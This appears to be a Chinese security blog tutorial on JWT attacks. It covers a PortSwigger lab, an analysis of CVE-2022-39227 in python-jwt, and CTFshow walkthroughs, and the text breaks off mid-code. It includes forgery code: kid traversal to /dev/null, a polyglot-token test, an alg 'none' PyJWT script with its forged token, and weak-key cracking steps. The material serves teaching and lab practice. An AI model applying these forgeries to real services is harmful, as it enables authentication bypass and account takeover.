stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>要解决实验室问题，请伪造一个 JWT，使您可以访问管理面板/admin，然后删除用户carlos。</p></blockquote>\n<p>题目条件</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>您可以使用以下凭据登录到您自己的帐户：wiener:peter</p></blockquote>\n<p>进入环境后，登录获取JWT<br>安装插件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152997.png\" alt=\"在这里插入图片描述\"><br>安装后选择<code>New Symmetric Key</code>，生成一个Key<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152003.png\" alt=\"在这里插入图片描述\"><br>接下来修改<code>K</code>参数为<code>AA==</code>，点击确认<br>抓靶场的包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152294.png\" alt=\"在这里插入图片描述\"><br>点击下面的<code>sign</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152360.png\" alt=\"在这里插入图片描述\"><br>将此时的JWT去替换网站的JWT，再刷新网站<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152394.png\" alt=\"在这里插入图片描述\"><br>成功越权<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152442.png\" alt=\"在这里插入图片描述\"><br>简单说一下这里的原理：这里其实就是利用了kid的目录遍历攻击，我们将kid参数指向标准文件<code>/dev/null</code>，此时我们再利用bp的工具设置一个空的签名密钥，就实现了越权，成功得到管理员权限。</p>\n<p>同时，这个Kid是Headers的一部分，<code>Headers</code>其实还有两个不常用的参数，即<code>Jwk</code>和<code>Jku</code>，这两个的话也是存在漏洞的，他们的攻击方式同<code>Kid</code>是较为相似的，所以这里不再去演示如何攻击。靶场环境如下，有兴趣的师傅可以看看。<br><a href=\"https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection\">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection</a><br><a href=\"https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection\">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection</a></p>\n<h1 id=\"JWT攻击实例\"><a href=\"#JWT攻击实例\" class=\"headerlink\" title=\"JWT攻击实例\"></a>JWT攻击实例</h1><h2 id=\"CVE-2022-39227\"><a href=\"#CVE-2022-39227\" class=\"headerlink\" title=\"CVE-2022-39227\"></a>CVE-2022-39227</h2><p>这个的话并没有给出具体的POC，但是官方在commit中最下方给出了测试代码<br><a href=\"https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9#diff-f3fb6499354e6fd16cb955d1f54138fa3481148f3f095467958b60b3835f3a50\">https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9</a><br>具体代码如下所示</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token triple-quoted-string string\">\"\"\" Test claim forgery vulnerability fix \"\"\"</span>\n<span class=\"token keyword\">from</span> datetime <span class=\"token keyword\">import</span> timedelta\n<span class=\"token keyword\">from</span> json <span class=\"token keyword\">import</span> loads<span class=\"token punctuation\">,</span> dumps\n<span class=\"token keyword\">from</span> test<span class=\"token punctuation\">.</span>common <span class=\"token keyword\">import</span> generated_keys\n<span class=\"token keyword\">from</span> test <span class=\"token keyword\">import</span> python_jwt <span class=\"token keyword\">as</span> jwt\n<span class=\"token keyword\">from</span> pyvows <span class=\"token keyword\">import</span> Vows<span class=\"token punctuation\">,</span> expect\n<span class=\"token keyword\">from</span> jwcrypto<span class=\"token punctuation\">.</span>common <span class=\"token keyword\">import</span> base64url_decode<span class=\"token punctuation\">,</span> base64url_encode\n\n<span class=\"token decorator annotation punctuation\">@Vows<span class=\"token punctuation\">.</span>batch</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">ForgedClaims</span><span class=\"token punctuation\">(</span>Vows<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\" Check we get an error when payload is forged using mix of compact and JSON formats \"\"\"</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">topic</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token triple-quoted-string string\">\"\"\" Generate token \"\"\"</span>\n        payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'sub'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'alice'</span><span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> jwt<span class=\"token punctuation\">.</span>generate_jwt<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> generated_keys<span class=\"token punctuation\">[</span><span class=\"token string\">'PS256'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'PS256'</span><span class=\"token punctuation\">,</span> timedelta<span class=\"token punctuation\">(</span>minutes<span class=\"token operator\">=</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">PolyglotToken</span><span class=\"token punctuation\">(</span>Vows<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token triple-quoted-string string\">\"\"\" Make a forged token \"\"\"</span>\n        <span class=\"token keyword\">def</span> <span class=\"token function\">topic</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> topic<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token triple-quoted-string string\">\"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\"</span>\n            <span class=\"token punctuation\">[</span>header<span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> topic<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span>\n            parsed_payload <span class=\"token operator\">=</span> loads<span class=\"token punctuation\">(</span>base64url_decode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            parsed_payload<span class=\"token punctuation\">[</span><span class=\"token string\">'sub'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'bob'</span>\n            parsed_payload<span class=\"token punctuation\">[</span><span class=\"token string\">'exp'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2000000000</span>\n            fake_payload <span class=\"token operator\">=</span> base64url_encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>dumps<span class=\"token punctuation\">(</span>parsed_payload<span class=\"token punctuation\">,</span> separators<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token string\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string\">'&#123;\"  '</span> <span class=\"token operator\">+</span> header <span class=\"token operator\">+</span> <span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> fake_payload <span class=\"token operator\">+</span> <span class=\"token string\">'.\":\"\",\"protected\":\"'</span> <span class=\"token operator\">+</span> header <span class=\"token operator\">+</span> <span class=\"token string\">'\", \"payload\":\"'</span> <span class=\"token operator\">+</span> payload <span class=\"token operator\">+</span> <span class=\"token string\">'\",\"signature\":\"'</span> <span class=\"token operator\">+</span> signature <span class=\"token operator\">+</span> <span class=\"token string\">'\"&#125;'</span>\n\n        <span class=\"token keyword\">class</span> <span class=\"token class-name\">Verify</span><span class=\"token punctuation\">(</span>Vows<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token triple-quoted-string string\">\"\"\" Check the forged token fails to verify \"\"\"</span>\n            <span class=\"token decorator annotation punctuation\">@Vows<span class=\"token punctuation\">.</span>capture_error</span>\n            <span class=\"token keyword\">def</span> <span class=\"token function\">topic</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> topic<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token triple-quoted-string string\">\"\"\" Verify the forged token \"\"\"</span>\n                <span class=\"token keyword\">return</span> jwt<span class=\"token punctuation\">.</span>verify_jwt<span class=\"token punctuation\">(</span>topic<span class=\"token punctuation\">,</span> generated_keys<span class=\"token punctuation\">[</span><span class=\"token string\">'PS256'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'PS256'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n            <span class=\"token keyword\">def</span> <span class=\"token function\">token_should_not_verify</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token triple-quoted-string string\">\"\"\" Check the token doesn't verify due to mixed format being detected \"\"\"</span>\n                expect<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to_be_an_error<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                expect<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to_equal<span class=\"token punctuation\">(</span><span class=\"token string\">'invalid JWT format'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>重点在中间部分，也就是这里</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">topic</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> topic<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token triple-quoted-string string\">\"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\"</span>\n            <span class=\"token punctuation\">[</span>header<span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> topic<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span>\n            parsed_payload <span class=\"token operator\">=</span> loads<span class=\"token punctuation\">(</span>base64url_decode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            parsed_payload<span class=\"token punctuation\">[</span><span class=\"token string\">'sub'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'bob'</span>\n            parsed_payload<span class=\"token punctuation\">[</span><span class=\"token string\">'exp'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2000000000</span>\n            fake_payload <span class=\"token operator\">=</span> base64url_encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>dumps<span class=\"token punctuation\">(</span>parsed_payload<span class=\"token punctuation\">,</span> separators<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token string\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string\">'&#123;\"  '</span> <span class=\"token operator\">+</span> header <span class=\"token operator\">+</span> <span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> fake_payload <span class=\"token operator\">+</span> <span class=\"token string\">'.\":\"\",\"protected\":\"'</span> <span class=\"token operator\">+</span> header <span class=\"token operator\">+</span> <span class=\"token string\">'\", \"payload\":\"'</span> <span class=\"token operator\">+</span> payload <span class=\"token operator\">+</span> <span class=\"token string\">'\",\"signature\":\"'</span> <span class=\"token operator\">+</span> signature <span class=\"token operator\">+</span> <span class=\"token string\">'\"&#125;'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看到这里的话首先是对JWT进行了拆分，我们知道JWT的格式是<code>xxx.yyy.zzz</code>，这个以<code>.</code>来分离，那就是把三部分拆分开来，分别赋值给了<code>header</code>、<code>payload</code>和<code>signature</code>，接下来将进行了<code>base64URL</code>以及<code>json</code>解码的<code>payload</code>赋值给了<code>parsed_payload</code>，而后将新内容<code>sub=bob</code>以及<code>exp=2000000000</code>放入了<code>parsed_payload</code>中，将进行过<code>Base64</code>编码和<code>json</code>编码的<code>parsed_payload</code>赋值给了<code>fake_payload </code>，最终生成的JWT格式如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\" header.fake_payload.\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"protected\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"header\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"payload\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"payload\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"signature\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"signature\"</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时就完成了JWT的伪造。</p>\n<p>那么这个漏洞是如何产生的呢？接下来我们看一下源文件。<br>查看<code>python_jwt/__init__.py</code>文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152509.png\" alt=\"在这里插入图片描述\"><br>首先看到 <code>header, claims, _ = jwt.split(&#39;.&#39;)</code>，它按<code>.</code>进行拆分，如何分别将三部分赋值给<code>headers</code>,<code>claims</code>以及<code>_</code>。<br>接下来就是对头部进行解码，而后检验头部算法，后面也是校验属性的，接下来走到JWS这里</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> pub_key<span class=\"token punctuation\">:</span> <span class=\"token comment\">#验证是否传入密钥</span>\n     token <span class=\"token operator\">=</span> JWS<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n     token<span class=\"token punctuation\">.</span>allowed_algs <span class=\"token operator\">=</span> allowed_algs\n     token<span class=\"token punctuation\">.</span>deserialize<span class=\"token punctuation\">(</span>jwt<span class=\"token punctuation\">,</span> pub_key<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 传入整个用户的JWT，JWS对JWT进行反序列化处理</span>\n     parsed_claims <span class=\"token operator\">=</span> json_decode<span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span>payload<span class=\"token punctuation\">)</span> <span class=\"token comment\"># JWS对传入部分进行json解码</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>跟进反序列化，看它是怎么做的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152562.png\" alt=\"在这里插入图片描述\"></p>\n<p>这里的话就是首先尝试对传入的JWT进行解析，我们知道这里传入的是完整的原始JWT，而非拆分后的某个部分，JWT的格式是<code>xxx.yyy.zzz</code>这种，而json能解析的是<code>&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;</code>这种格式的，所以它无疑会走向<code>except ValueError</code>这里，然后它对值进行拆分，分别赋给<code>protected</code>、<code>payload</code>和<code>signature</code>，然后就将<code>o</code>赋值给了<code>self.objects</code>，这里的话还有一个<code>verify(key,alg)</code>函数，我们跟进一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152734.png\" alt=\"在这里插入图片描述\"><br>这里可以看到它其实是对JWT的各部分内容进行了一个检验，它这里检验的是原来的完整的JWT，所以这个肯定是没有问题的，这个验证肯定是可以通过的。</p>\n<p>我们此时回到<code>__init__.py</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152783.png\" alt=\"在这里插入图片描述\">发现这里在校验过后，后面都没有再用到<code>token</code>这个，后面是对<code>header</code>和<code>claims</code>中的一些参数进行校验，然后将<code>parsed_header</code>和<code>parsed_claims</code>值返回了。这里就是问题所在， 在对整个JWT进行校验过后，没有返回校验过的数据，而是返回一开始进行点分过后的数据。</p>\n<p>我们的恶意payload如下所示<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152853.png\" alt=\"在这里插入图片描述\"><br>此时拆分后他一直在校验的是后面的灰色部分，这部分是原始的JWT，校验肯定是可以通过的，而我们最终返回的数据是前面的<code>forged_payload</code>,所以无论前面怎么添加，怎么替换，校验都是可以通过的。此时你再去看官方给出的测试代码就可以理解它的思路了。</p>\n<h1 id=\"CTF实战\"><a href=\"#CTF实战\" class=\"headerlink\" title=\"CTF实战\"></a>CTF实战</h1><h2 id=\"CTFshow系列\"><a href=\"#CTFshow系列\" class=\"headerlink\" title=\"CTFshow系列\"></a>CTFshow系列</h2><h3 id=\"Web345\"><a href=\"#Web345\" class=\"headerlink\" title=\"Web345\"></a>Web345</h3><p>打开靶场，进入环境<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152932.png\" alt=\"在这里插入图片描述\"><br>看一下源代码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152072.png\" alt=\"在这里插入图片描述\"><br>提示了admin界面，先记着。<br>同时刚刚发现cookie含有JWT，放入网站<a href=\"https://jwt.io/\">https://jwt.io/</a>中查看一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152141.png\" alt=\"在这里插入图片描述\"><br>加密方式为空加密，所以这里的话，我们base64解码一下，然后直接修改<code>sub</code>为<code>admin</code>，再进行base64编码，放入cookie中即可，接下来访问admin界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152196.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web346\"><a href=\"#web346\" class=\"headerlink\" title=\"web346\"></a>web346</h3><p>这里进入环境后，接下来进入靶场，看一下JWT，用解密网站解密一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152278.png\" alt=\"在这里插入图片描述\"></p>\n<p>发现有了加密格式，然后这里存在一种漏洞就是可以把加密方式换成空加密来绕过，但是这个网站是不能直接修改的，我们这里可以借助python脚本实现，脚本如下所示</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">import</span> jwt\n\n<span class=\"token comment\"># payload</span>\ntoken_dict<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token string\">\"iss\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"iat\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1668871293</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"exp\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1668878493</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"nbf\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1668871293</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"sub\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"jti\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"9892b9d99098ba229891bedcfa856b61\"</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\"># headers</span>\nheaders <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token string\">\"alg\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"none\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"typ\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"JWT\"</span>\n<span class=\"token punctuation\">&#125;</span>\n\njwt_token <span class=\"token operator\">=</span> jwt<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>token_dict<span class=\"token punctuation\">,</span>  <span class=\"token comment\"># payload, 有效载体 </span>\n\t\t\t\t\t key<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span>\n                       headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">,</span>  <span class=\"token comment\"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span>\n \t\t\t\t\t   algorithm<span class=\"token operator\">=</span><span class=\"token string\">\"none\"</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 指明签名算法方式, 默认也是HS256</span>\n                       <span class=\"token punctuation\">)</span>  <span class=\"token comment\"># python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>jwt_token<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注:这里安装jwt模块的时候，安装的模块是PyJWT模块，同时不要给脚本名字命名为jwt.py，否则运行脚本时就会发生报错。</p></blockquote>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152352.png\" alt=\"在这里插入图片描述\"></p>\n<p>接下来运行脚本<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152472.png\" alt=\"在这里插入图片描述\"><br>得到JWT</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0<span class=\"token punctuation\">.</span>eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY2ODg3MTI5MywiZXhwIjoxNjY4ODc4NDkzLCJuYmYiOjE2Njg4NzEyOTMsInN1YiI6ImFkbWluIiwianRpIjoiOTg5MmI5ZDk5MDk4YmEyMjk4OTFiZWRjZmE4NTZiNjEifQ<span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>去靶场中替换一下，同时访问<code>admin</code>界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152490.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"Web347\"><a href=\"#Web347\" class=\"headerlink\" title=\"Web347\"></a>Web347</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152652.png\" alt=\"在这里插入图片描述\"><br>提示弱口令，这里应该说的是密钥，先记着<br>进入环境后找到JWT去对应网站解码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152728.png\" alt=\"在这里插入图片描述\"><br><code>HS256</code>加密方式，我们这里的话需要猜解一下密钥，然后修改才有效，既然提示了弱口令，那就可以试试<code>123456</code>这种，修改<code>sub</code>为<code>admin</code>，得到新JWT后去靶场中修改JWT，然后访问admin界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152794.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"Web348\"><a href=\"#Web348\" class=\"headerlink\" title=\"Web348\"></a>Web348</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152905.png\" alt=\"在这里插入图片描述\"><br>题目提示爆破，这里就需要先介绍一个爆破工具了，链接如下<br><a href=\"https://github.com/brendan-rius/c-jwt-cracker\">https://github.com/brendan-rius/c-jwt-cracker</a><br>安装方式也很简单</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、git <span class=\"token keyword\">clone</span> https<span class=\"token punctuation\">:</span><span class=\"token 